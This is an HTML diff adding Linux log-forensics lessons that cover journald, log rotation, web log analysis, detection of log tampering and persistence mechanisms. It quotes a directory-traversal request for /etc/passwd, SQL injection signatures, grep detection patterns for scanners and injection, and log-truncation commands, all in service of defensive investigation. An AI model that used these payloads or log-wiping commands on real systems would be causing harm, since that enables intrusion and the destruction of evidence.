+        <div class="arch-box arch-box--file">/var/log/syslog<br><span style="font-size:.72rem;font-weight:400;color:rgba(249,199,79,.7)">plain-text (rsyslog output)</span></div>
+        <div class="arch-box arch-box--file">/var/log/auth.log<br><span style="font-size:.72rem;font-weight:400;color:rgba(249,199,79,.7)">auth events (plain-text)</span></div>
+      </div>
+    </div>
+
+    <h3 class="mt-md">syslog vs. rsyslog vs. journald — What's the Difference?</h3>
+
+    <div class="compare-table-wrap">
+      <table class="compare-table" aria-label="Comparison of Linux logging systems">
+        <thead>
+          <tr>
+            <th scope="col">System</th>
+            <th scope="col">Format</th>
+            <th scope="col">Default On</th>
+            <th scope="col">Forensic Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>syslog (legacy)</td>
+            <td>Plain text — <code>/var/log/syslog</code></td>
+            <td>Older SysV-init systems</td>
+            <td>Human-readable; easily grepped; easily deleted or truncated by attacker</td>
+          </tr>
+          <tr>
+            <td>rsyslog</td>
+            <td>Plain text with structured templates; can forward to remote syslog server</td>
+            <td>Ubuntu, Debian (alongside journald)</td>
+            <td>Config at <code>/etc/rsyslog.conf</code>; check for remote forwarding rules that could exfiltrate logs</td>
+          </tr>
+          <tr>
+            <td>systemd-journald</td>
+            <td>Binary journal — requires <code>journalctl</code> to read</td>
+            <td>All systemd-based distros (Ubuntu 16.04+, RHEL 7+)</td>
+            <td>Tamper-evident (FSS forward-secure sealing optional); stores metadata; binary format harder to silently truncate</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout--info">
+      <p class="callout__label">💡 Why Both Exist on Ubuntu 22.04</p>
+      <p>On <strong>web-prod-03</strong> (Ubuntu 22.04), <strong>both journald and rsyslog are active</strong>. journald collects everything first; rsyslog subscribes to journald's socket and writes selected messages to <code>/var/log/syslog</code>, <code>/var/log/auth.log</code>, etc. This means you have two independent copies of many events — a powerful cross-validation tool. If the plain-text logs are tampered with, the binary journal may still be intact.</p>
+    </div>
+
+    <h3 class="mt-md">journalctl Query Syntax — Forensic Essentials</h3>
+    <p>The <code>journalctl</code> command is your primary interface to the binary journal. On a live system, run as root; on a forensic image, point it at the journal directory with <code>-D</code>.</p>
+
+    <div class="code-block" role="region" aria-label="journalctl command examples">
+      <span class="comment"># Read journal from a mounted forensic image (dead-box analysis)</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">-D</span> <span class="path">/mnt/evidence/var/log/journal</span><br><br>
+      <span class="comment"># Filter by time window — critical for incident scoping</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">--since</span> <span class="flag">"2026-03-01 20:00:00"</span> <span class="flag">--until</span> <span class="flag">"2026-03-01 22:00:00"</span><br><br>
+      <span class="comment"># Show only SSH authentication events (unit filter)</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">-u</span> ssh.service<br><br>
+      <span class="comment"># Show kernel messages only (equivalent to dmesg)</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">-k</span><br><br>
+      <span class="comment"># Show messages from a specific process ID</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">_PID=</span>1337<br><br>
+      <span class="comment"># Show messages from a specific executable path</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">_EXE=</span><span class="path">/usr/bin/sudo</span><br><br>
+      <span class="comment"># Output in JSON for scripted analysis</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">-o</span> json-pretty <span class="flag">--since</span> <span class="flag">"2026-03-01"</span><br><br>
+      <span class="comment"># Show boot sessions — each -b N is a past boot</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">--list-boots</span><br>
+      <span class="cmd">journalctl</span> <span class="flag">-b</span> <span class="flag">-1</span>   <span class="comment"># previous boot session</span>
+    </div>
+
+    <h3 class="mt-md">Log Rotation and Its Forensic Implications</h3>
+    <p>Linux systems automatically rotate log files on a schedule managed by <strong>logrotate</strong> (configured in <code>/etc/logrotate.conf</code> and <code>/etc/logrotate.d/</code>). Understanding rotation is essential for reconstructing complete timelines.</p>
+
+    <div class="compare-table-wrap">
+      <table class="compare-table" aria-label="Log rotation file naming convention">
+        <thead>
+          <tr>
+            <th scope="col">File Name</th>
+            <th scope="col">Age / Status</th>
+            <th scope="col">Forensic Note</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>/var/log/auth.log</code></td>
+            <td>Current (active writes)</td>
+            <td>Most recent events; may be incomplete if rotation just occurred</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/auth.log.1</code></td>
+            <td>Previous rotation (plain text)</td>
+            <td>Immediately prior period; check mtime for rotation timestamp</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/auth.log.2.gz</code></td>
+            <td>Two rotations ago (gzip compressed)</td>
+            <td>Use <code>zcat</code> or <code>zgrep</code> to read without decompressing</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/auth.log.N.gz</code></td>
+            <td>N rotations ago</td>
+            <td>Retention period depends on <code>logrotate</code> config (often 4–8 weeks)</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout--warn">
+      <p class="callout__label">⚠️ Forensic Implication of Log Rotation</p>
+      <p>Always examine <strong>all rotated log files</strong>, not just the current one. An attack that began weeks ago may only be visible in compressed rotated logs. Conversely, if rotated logs are <em>missing</em> for expected time periods, or if the compressed archives have been deleted, that absence is itself evidence of anti-forensic activity. Check <code>logrotate</code> configuration to understand the expected retention schedule, then verify whether that many rotation files actually exist.</p>
+    </div>
+
+    <div class="code-block" role="region" aria-label="Commands to search across rotated log files">
+      <span class="comment"># Search across ALL rotated auth logs (current + compressed)</span><br>
+      <span class="cmd">zgrep</span> <span class="flag">"Accepted publickey"</span> <span class="path">/var/log/auth.log*</span><br><br>
+      <span class="comment"># List all rotated logs with sizes and timestamps</span><br>
+      <span class="cmd">ls -lh</span> <span class="path">/var/log/auth.log*</span><br><br>
+      <span class="comment"># Decompress and concatenate for timeline tools</span><br>
+      <span class="cmd">zcat</span> <span class="path">/var/log/auth.log.2.gz</span> | <span class="cmd">grep</span> <span class="flag">"Mar  1"</span>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 2 — KEY LOG FILES REFERENCE
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="log-files-ref" aria-labelledby="logfiles-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">📋</div>
+      <h2 id="logfiles-heading">2 · Key Log Files Reference</h2>
+    </div>
+
+    <p>The table below is your field reference for <code>/var/log/</code>. Forensic value ratings reflect how frequently each file yields decisive evidence in server-compromise investigations.</p>
+
+    <div class="compare-table-wrap">
+      <table class="compare-table" aria-label="Linux log files forensic reference table">
+        <thead>
+          <tr>
+            <th scope="col">Log File / Path</th>
+            <th scope="col">Owner / Perms</th>
+            <th scope="col">Forensic Value</th>
+            <th scope="col">Key Evidence</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>/var/log/auth.log</code><br><span style="font-size:.75rem;color:#888;">(Debian/Ubuntu)</span></td>
+            <td><code>root:adm</code><br>640</td>
+            <td><span class="tag tag--red">CRITICAL</span></td>
+            <td>SSH logins (accepted/failed), sudo usage, su attempts, PAM events, account creation via <code>useradd</code></td>
+          </tr>
+          <tr>
+            <td><code>/var/log/secure</code><br><span style="font-size:.75rem;color:#888;">(RHEL/CentOS)</span></td>
+            <td><code>root:root</code><br>600</td>
+            <td><span class="tag tag--red">CRITICAL</span></td>
+            <td>Same as auth.log — RHEL equivalent; also contains SELinux denials if auditd not configured</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/syslog</code></td>
+            <td><code>root:adm</code><br>640</td>
+            <td><span class="tag tag--red">HIGH</span></td>
+            <td>General system messages; daemon start/stop; cron job execution records; kernel messages</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/apache2/access.log</code><br><code>/var/log/nginx/access.log</code></td>
+            <td><code>root:adm</code><br>640</td>
+            <td><span class="tag tag--red">CRITICAL</span></td>
+            <td>Every HTTP request; source IP; user agent; response code; bytes transferred — primary web attack evidence</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/apache2/error.log</code><br><code>/var/log/nginx/error.log</code></td>
+            <td><code>root:adm</code><br>640</td>
+            <td><span class="tag tag--red">HIGH</span></td>
+            <td>Web application errors; PHP fatal errors; permission denied events; file-not-found patterns revealing attacker probing</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/wtmp</code></td>
+            <td><code>root:utmp</code><br>664</td>
+            <td><span class="tag tag--amber">HIGH</span></td>
+            <td>Binary: all login/logout events; parse with <code>last</code>; shows terminal, source IP, session duration</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/btmp</code></td>
+            <td><code>root:utmp</code><br>660</td>
+            <td><span class="tag tag--amber">HIGH</span></td>
+            <td>Binary: failed login attempts; parse with <code>lastb</code>; brute-force evidence</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/lastlog</code></td>
+            <td><code>root:root</code><br>644</td>
+            <td><span class="tag tag--amber">MEDIUM</span></td>
+            <td>Binary: last login time per user; parse with <code>lastlog</code>; identifies dormant accounts that suddenly activated</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/dpkg.log</code><br><code>/var/log/apt/history.log</code></td>
+            <td><code>root:root</code><br>644</td>
+            <td><span class="tag tag--amber">MEDIUM</span></td>
+            <td>Package install/remove history with timestamps; look for attacker-installed tools (netcat, nmap, socat, gcc)</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/audit/audit.log</code><br><span style="font-size:.75rem;color:#888;">(RHEL + auditd)</span></td>
+            <td><code>root:root</code><br>600</td>
+            <td><span class="tag tag--red">CRITICAL</span></td>
+            <td>Detailed syscall-level audit trail; file access, privilege use, network connections — most granular Linux log source</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/kern.log</code></td>
+            <td><code>root:adm</code><br>640</td>
+            <td><span class="tag tag--blue">MEDIUM</span></td>
+            <td>Kernel messages; USB device insertion; driver errors; LKM (rootkit module) load events</td>
+          </tr>
+          <tr>
+            <td><code>/var/log/cron</code><br><code>/var/log/syslog</code> (cron entries)</td>
+            <td><code>root:root</code><br>600</td>
+            <td><span class="tag tag--amber">MEDIUM</span></td>
+            <td>Cron job execution records; timestamps of scheduled task runs — corroborate suspicious crontab entries</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout callout--info">
+      <p class="callout__label">🔍 Quick Reference — Binary Log Parsers</p>
+      <ul>
+        <li><code>last -F -a</code> — Parse <code>/var/log/wtmp</code>; <code>-F</code> shows full timestamps; <code>-a</code> shows hostname last</li>
+        <li><code>lastb -F</code> — Parse <code>/var/log/btmp</code> for failed logins</li>
+        <li><code>lastlog</code> — Show last login per user from <code>/var/log/lastlog</code></li>
+        <li><code>utmpdump /var/log/wtmp</code> — Raw dump of wtmp in text format for scripted analysis</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 3 — WEB SERVER LOG ANALYSIS
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="web-log-analysis" aria-labelledby="weblog-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">🌐</div>
+      <h2 id="weblog-heading">3 · Web Server Log Analysis</h2>
+    </div>
+
+    <p>Web server access logs are often the <strong>first place evidence of an attack appears</strong> on a compromised server. Every HTTP request — including exploit attempts — is recorded. Learning to read these logs fluently is a core forensic skill.</p>
+
+    <h3>Apache Combined Log Format — Annotated</h3>
+    <p>Apache's default "combined" log format records one line per request. The example below is a real-looking malicious request — each field is color-coded and explained.</p>
+
+    <div class="log-annotated" role="region" aria-label="Annotated Apache access log line showing a malicious request">
+      <p class="log-annotated__title">Apache Access Log — Annotated Line</p>
+
+      <div class="log-line" aria-label="Example log entry">
+        <span class="log-field lf-ip">203.0.113.47</span>
+        <span class="log-field lf-ident">-</span>
+        <span class="log-field lf-ident">-</span>
+        <span class="log-field lf-time">[01/Mar/2026:21:14:33 +0000]</span>
+        <span class="log-field lf-req">"GET /admin/../../../etc/passwd HTTP/1.1"</span>
+        <span class="log-field lf-status--err">400</span>
+        <span class="log-field lf-bytes">512</span>
+        <span class="log-field lf-ref">"-"</span>
+        <span class="log-field lf-ua">"sqlmap/1.7.8#stable (https://sqlmap.org)"</span>
+      </div>
+
+      <div class="log-ann" aria-label="Field explanations">
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#90e0ef;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Client IP (203.0.113.47):</strong> The source IP of the request. Cross-reference with <code>auth.log</code> SSH logins. Multiple attack types from one IP = coordinated campaign.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#888;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Ident / Auth fields (- -):</strong> Almost always dashes in practice. Ignore.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#b8e0a0;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Timestamp [01/Mar/2026:21:14:33 +0000]:</strong> Request time in server local time (UTC here). Note the timezone offset — normalize all timestamps to UTC for timeline analysis.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#f9c74f;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Request "GET /admin/../../../etc/passwd HTTP/1.1":</strong> Method + URI + protocol. This URI contains <strong>directory traversal sequences</strong> (<code>../</code>) attempting to escape the web root and read <code>/etc/passwd</code>. A clear attack indicator.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#ff9f7f;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Status Code (400):</strong> HTTP response code. 400 = Bad Request (server rejected the traversal). A <strong>200 response to a traversal attempt</strong> would indicate successful exploitation. Watch for 200s on suspicious URIs.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#c9a0dc;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Bytes Transferred (512):</strong> Response body size in bytes. A large byte count on a suspicious request may indicate data was successfully returned to the attacker.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#d4c47a;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>Referer ("-"):</strong> The page that linked to this request. A dash means no referrer (direct request or automated tool). Legitimate users usually have referrers; scanners often do not.</div>
+        </div>
+        <div class="log-ann__item">
+          <div class="log-ann__swatch" style="background:#7adcd4;" aria-hidden="true"></div>
+          <div class="log-ann__text"><strong>User-Agent ("sqlmap/1.7.8..."):</strong> The client software string. <strong>sqlmap</strong> is an automated SQL injection tool — its presence in a User-Agent is an unambiguous attack indicator. Legitimate browsers never identify as sqlmap.</div>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="mt-md">Web Attack Signatures in Access Logs</h3>
+    <p>The following attack patterns leave characteristic signatures in web server logs. Recognizing them is a core skill tested on the CHFI and GCFE certifications.</p>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-traversal" id="btn-traversal">
+        <span aria-hidden="true">📂</span>
+        <span>Directory Traversal / Path Traversal</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-traversal" role="region" aria-labelledby="btn-traversal">
+        <p><strong>Goal:</strong> Escape the web root to read sensitive files (<code>/etc/passwd</code>, <code>/etc/shadow</code>, application config files with credentials).</p>
+        <p><strong>Log signatures to look for:</strong></p>
+        <ul>
+          <li><code>../</code> or <code>%2e%2e%2f</code> (URL-encoded) in the URI</li>
+          <li><code>..%2F</code>, <code>..%5C</code>, <code>%252e%252e%252f</code> (double-encoded)</li>
+          <li>References to <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/proc/self/environ</code> in URIs</li>
+        </ul>
+        <div class="code-block" style="margin-top:.5rem;" role="region" aria-label="Directory traversal grep example">
+          <span class="cmd">grep</span> <span class="flag">-E</span> <span class="flag">'(\.\./|%2e%2e|%252e)'</span> <span class="path">/var/log/apache2/access.log</span>
+        </div>
+        <div class="callout callout--warn" style="margin-top:.6rem; margin-bottom:0;">
+          <p class="callout__label">⚠️ Status Code Matters</p>
+          <p>A 400 or 403 response means the server blocked the attempt. A <strong>200 response to a traversal URI is critical evidence of successful exploitation</strong> — the server returned the requested file contents.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-sqli" id="btn-sqli">
+        <span aria-hidden="true">💉</span>
+        <span>SQL Injection (SQLi)</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-sqli" role="region" aria-labelledby="btn-sqli">
+        <p><strong>Goal:</strong> Inject SQL code into database queries via URL parameters or POST data to extract data, bypass authentication, or execute commands.</p>
+        <p><strong>Log signatures to look for:</strong></p>
+        <ul>
+          <li>SQL keywords in URI parameters: <code>UNION</code>, <code>SELECT</code>, <code>FROM</code>, <code>WHERE</code>, <code>OR 1=1</code>, <code>DROP TABLE</code></li>
+          <li>URL-encoded SQL: <code>%27</code> (single quote), <code>%20OR%201%3D1</code></li>
+          <li>Automated tool User-Agents: <code>sqlmap</code>, <code>Havij</code>, <code>jSQL</code></li>
+          <li>High volume of requests to the same endpoint with varying parameters</li>
+        </ul>
+        <div class="code-block" style="margin-top:.5rem;" role="region" aria-label="SQL injection grep example">
+          <span class="cmd">grep</span> <span class="flag">-iE</span> <span class="flag">'(union.*select|or.*1=1|%27|%20or%20|sqlmap)'</span> <span class="path">/var/log/apache2/access.log</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-scanner" id="btn-scanner">
+        <span aria-hidden="true">🔍</span>
+        <span>Automated Scanner / Reconnaissance User-Agents</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-scanner" role="region" aria-labelledby="btn-scanner">
+        <p><strong>Goal:</strong> Map the application's attack surface — discover directories, files, technologies, and vulnerabilities — before targeted exploitation.</p>
+        <p><strong>Recognizable scanner User-Agents:</strong></p>
+        <ul>
+          <li><code>Nikto</code> — web vulnerability scanner</li>
+          <li><code>sqlmap</code> — SQL injection automation</li>
+          <li><code>Nmap Scripting Engine</code> — port/service scanner</li>
+          <li><code>dirbuster</code>, <code>gobuster</code>, <code>feroxbuster</code> — directory brute-forcers</li>
+          <li><code>python-requests</code>, <code>curl/</code> — often used by custom exploit scripts</li>
+          <li><code>Masscan</code>, <code>ZGrab</code> — mass internet scanners</li>
+        </ul>
+        <p><strong>Behavioral signatures:</strong></p>
+        <ul>
+          <li>Hundreds of 404 responses in rapid succession (directory brute-force)</li>
+          <li>Requests for common CMS paths (<code>/wp-admin</code>, <code>/phpmyadmin</code>, <code>/.git/</code>) on a non-CMS server</li>
+          <li>Sequential IP addresses or identical timing patterns (automated)</li>
+        </ul>
+        <div class="code-block" style="margin-top:.5rem;" role="region" aria-label="Scanner detection grep example">
+          <span class="cmd">grep</span> <span class="flag">-iE</span> <span class="flag">'(nikto|sqlmap|dirbuster|gobuster|masscan|python-requests)'</span> <span class="path">/var/log/apache2/access.log</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="false" aria-controls="panel-webshell" id="btn-webshell">
+        <span aria-hidden="true">🐚</span>
+        <span>Web Shell Access Patterns</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel" id="panel-webshell" role="region" aria-labelledby="btn-webshell">
+        <p><strong>Goal:</strong> After uploading a web shell (a malicious script that executes commands), the attacker accesses it repeatedly to run commands on the server.</p>
+        <p><strong>Log signatures:</strong></p>
+        <ul>
+          <li>POST requests to unusual file names in upload directories (e.g., <code>POST /uploads/image.php</code>)</li>
+          <li>Requests to <code>.php</code> files in directories that should only contain static content (<code>/images/</code>, <code>/uploads/</code>)</li>
+          <li>Large POST bodies to unexpected endpoints (command input)</li>
+          <li>200 responses to requests for recently created PHP files</li>
+          <li>User-Agent strings like <code>Mozilla/5.0</code> but with unusual parameter patterns (manual attacker interaction)</li>
+        </ul>
+        <div class="callout callout--info" style="margin-top:.6rem; margin-bottom:0;">
+          <p class="callout__label">🔗 Cross-Artifact Correlation</p>
+          <p>If you identify a suspicious PHP file being accessed in the web logs, cross-reference with the filesystem: check the file's <code>mtime</code> (when it was written), compare to the first access log entry for that file, and look for the upload event in earlier log entries. This reconstructs the complete web shell deployment timeline.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 4 — LOG TAMPERING DETECTION
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="log-tampering" aria-labelledby="tampering-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">🚨</div>
+      <h2 id="tampering-heading">4 · Log Tampering Detection</h2>
+    </div>
+
+    <div class="callout callout--danger">
+      <p class="callout__label">🔑 Core Forensic Principle</p>
+      <p><strong>The absence of logs is evidence.</strong> When an attacker deletes or truncates log files, they leave a different kind of evidence: the gap itself. A sophisticated forensic examiner treats missing, incomplete, or inconsistent logs as a positive finding — not a dead end. Document every gap with the same rigor as a positive artifact.</p>
+    </div>
+
+    <h3>Indicator 1 — Timestamp Gaps</h3>
+    <p>A healthy, continuously running server produces a nearly unbroken stream of log entries. Gaps where no entries appear for extended periods — especially during the suspected intrusion window — are a primary tampering indicator.</p>
+
+    <div class="code-block" role="region" aria-label="Finding timestamp gaps in auth.log">
+      <span class="comment"># Extract timestamps from auth.log to find gaps</span><br>
+      <span class="cmd">awk</span> <span class="flag">'{print $1, $2, $3}'</span> <span class="path">/var/log/auth.log</span> | <span class="cmd">head</span> <span class="flag">-5</span><br>
+      <span class="dim"># Output example:</span><br>
+      <span class="dim"># Mar  1 20:55:01</span><br>
+      <span class="dim"># Mar  1 20:55:03</span><br>
+      <span class="dim"># Mar  1 21:32:17  ← last entry before gap</span><br>
+      <span class="dim"># Mar  2 08:11:44  ← next entry — ~10.5 hour gap on an active server!</span><br><br>
+      <span class="comment"># Cross-reference: did the system reboot? Check wtmp</span><br>
+      <span class="cmd">last</span> <span class="flag">-F</span> <span class="flag">reboot</span>
+    </div>
+
+    <h3 class="mt-md">Indicator 2 — File mtime Inconsistency</h3>
+    <p>Log files are written sequentially — their <strong>modification time (mtime)</strong> should reflect the time of the last written entry. If the mtime of a log file is <em>earlier than</em> the last entry it contains, or if the mtime is suspiciously round (e.g., exactly midnight), the file has likely been touched or replaced.</p>
+
+    <div class="code-block" role="region" aria-label="Checking log file modification times">
+      <span class="comment"># Check modification times of all log files</span><br>
+      <span class="cmd">ls -la --time-style=full-iso</span> <span class="path">/var/log/</span><br><br>
+      <span class="comment"># Compare mtime of auth.log to the timestamp of its last entry</span><br>
+      <span class="cmd">stat</span> <span class="path">/var/log/auth.log</span><br>
+      <span class="cmd">tail</span> <span class="flag">-1</span> <span class="path">/var/log/auth.log</span><br><br>
+      <span class="comment"># If mtime is BEFORE the last log entry timestamp → file was backdated</span><br>
+      <span class="comment"># If mtime is much LATER than last entry → file was modified after logging stopped</span>
+    </div>
+
+    <h3 class="mt-md">Indicator 3 — Truncated Files</h3>
+    <p>The simplest anti-forensic technique is truncating a log file to zero bytes (<code>cat /dev/null &gt; /var/log/auth.log</code> or <code>truncate -s 0 /var/log/auth.log</code>). This preserves the file's existence (so a basic check passes) but destroys all content.</p>
+
+    <div class="code-block" role="region" aria-label="Detecting truncated log files">
+      <span class="comment"># Find zero-byte or suspiciously small log files</span><br>
+      <span class="cmd">find</span> <span class="path">/var/log/</span> <span class="flag">-type f -name "*.log" -size 0</span><br><br>
+      <span class="comment"># Find log files smaller than 1KB (suspicious for an active server)</span><br>
+      <span class="cmd">find</span> <span class="path">/var/log/</span> <span class="flag">-type f -name "*.log" -size -1k</span><br><br>
+      <span class="comment"># Check inode change time (ctime) — ctime updates even if mtime is faked</span><br>
+      <span class="cmd">stat</span> <span class="path">/var/log/auth.log</span>   <span class="comment"># look at "Change:" field</span>
+    </div>
+
+    <h3 class="mt-md">Indicator 4 — Cross-Source Correlation</h3>
+    <p>The most powerful tampering detection technique is <strong>cross-source correlation</strong> — comparing the same events across multiple independent log sources. An attacker who deletes <code>/var/log/auth.log</code> may forget that the same SSH login event is also recorded in the binary journal.</p>
+
+    <div class="two-col">
+      <div class="callout callout--info" style="margin-bottom:0;">
+        <p class="callout__label">📌 Cross-Source Pairs to Correlate</p>
+        <ul>
+          <li><code>auth.log</code> ↔ <code>journald</code> (SSH events)</li>
+          <li><code>auth.log</code> ↔ <code>wtmp</code> (login sessions)</li>
+          <li>Web access log ↔ web error log (same request, two views)</li>
+          <li>Cron execution in <code>syslog</code> ↔ crontab file contents</li>
+          <li>Package install in <code>dpkg.log</code> ↔ binary presence on disk</li>
+        </ul>
+      </div>
+      <div class="callout callout--warn" style="margin-bottom:0;">
+        <p class="callout__label">⚠️ Remote Syslog as Anti-Tamper</p>
+        <p>Organizations that forward logs to a remote syslog server or SIEM make it much harder for attackers to destroy evidence. On <strong>web-prod-03</strong>, check <code>/etc/rsyslog.conf</code> for remote forwarding rules — if logs were forwarded, the SOC may have intact copies even if local logs were wiped.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 5 — LINUX PERSISTENCE MECHANISMS
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="persistence" aria-labelledby="persist-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">🔒</div>
+      <h2 id="persist-heading">5 · Linux Persistence Mechanisms</h2>
+    </div>
+
+    <p>After gaining access to a system, attackers establish <strong>persistence</strong> — mechanisms that allow them to regain access after reboots, password changes, or partial remediation. Identifying all persistence mechanisms is critical: missing even one means the attacker can return.</p>
+
+    <!-- Persistence map -->
+    <div class="persist-map" role="list" aria-label="Linux persistence mechanism categories">
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">⏰</div>
+        <div class="persist-card__name">Cron Jobs</div>
+        <span class="persist-card__risk risk--critical">CRITICAL</span>
+      </div>
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">⚙️</div>
+        <div class="persist-card__name">systemd Units</div>
+        <span class="persist-card__risk risk--critical">CRITICAL</span>
+      </div>
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">🔑</div>
+        <div class="persist-card__name">SSH Keys</div>
+        <span class="persist-card__risk risk--critical">CRITICAL</span>
+      </div>
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">🏴</div>
+        <div class="persist-card__name">SUID/SGID</div>
+        <span class="persist-card__risk risk--high">HIGH</span>
+      </div>
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">📦</div>
+        <div class="persist-card__name">LD_PRELOAD</div>
+        <span class="persist-card__risk risk--high">HIGH</span>
+      </div>
+      <div class="persist-card" role="listitem">
+        <div class="persist-card__icon" aria-hidden="true">🧬</div>
+        <div class="persist-card__name">LKM Rootkits</div>
+        <span class="persist-card__risk risk--critical">CRITICAL</span>
+      </div>
+    </div>
+
+    <!-- CRON JOBS -->
+    <div class="accordion">
+      <button class="accordion__trigger" aria-expanded="true" aria-controls="panel-cron" id="btn-cron">
+        <span aria-hidden="true">⏰</span>
+        <span>Cron Jobs — Locations, Syntax, and Red Flag Patterns</span>
+        <span class="accordion__icon" aria-hidden="true">▼</span>
+      </button>
+      <div class="accordion__panel is-open" id="panel-cron" role="region" aria-labelledby="btn-cron">
+        <p>Cron is the standard Linux job scheduler. It executes commands at defined time intervals — making it a natural persistence mechanism. An attacker-planted cron job can re-download malware, beacon to a C2 server, or re-add a deleted SSH key on a schedule.</p>
+
+        <h4>Cron File Locations — Examine All of These</h4>
+        <div class="compare-table-wrap">
+          <table class="compare-table" aria-label="Cron file locations">
+            <thead>
+              <tr><th scope="col">Location</th><th scope="col">Scope</th><th scope="col">How to Read</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>/etc/crontab</code></td>
+                <td>System-wide; includes username field</td>
+                <td><code>cat /etc/crontab</code></td>
+              </tr>
+              <tr>
+                <td><code>/etc/cron.d/</code></td>
+                <td>System-wide; package-installed cron files</td>
+                <td><code>ls -la /etc/cron.d/</code> then <code>cat</code> each file</td>
+              </tr>
+              <tr>
+                <td><code>/etc/cron.hourly/</code>, <code>daily/</code>, <code>weekly/</code>, <code>monthly/</code></td>
+                <td>Scripts run at those intervals by <code>/etc/crontab</code></td>
+                <td><code>ls -la /etc/cron.*/</code></td>
+              </tr>
+              <tr>
+                <td><code>/var/spool/cron/crontabs/username</code></td>
+                <td>Per-user crontabs (created with <code>crontab -e</code>)</td>
+                <td><code>cat /var/spool/cron/crontabs/root</code> — <strong>always check root's crontab</strong></td>
+              </tr>
+              <tr>
+                <td><code>/var/spool/cron/username</code></td>
+                <td>Per-user (RHEL path variant)</td>
+                <td>Same approach as above</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h4 class="mt-md">Cron Entry Syntax</h4>
+        <div class="code-block" role="region" aria-label="Cron syntax explanation">
+          <span class="comment"># ┌─ minute (0-59)</span><br>
+          <span class="comment"># │  ┌─ hour (0-23)</span><br>
+          <span class="comment"># │  │  ┌─ day of month (1-31)</span><br>
+          <span class="comment"># │  │  │  ┌─ month (1-12)</span><br>
+          <span class="comment"># │  │  │  │  ┌─ day of week (0-7, 0=Sun)</span><br>
+          <span class="comment"># │  │  │  │  │</span><br>
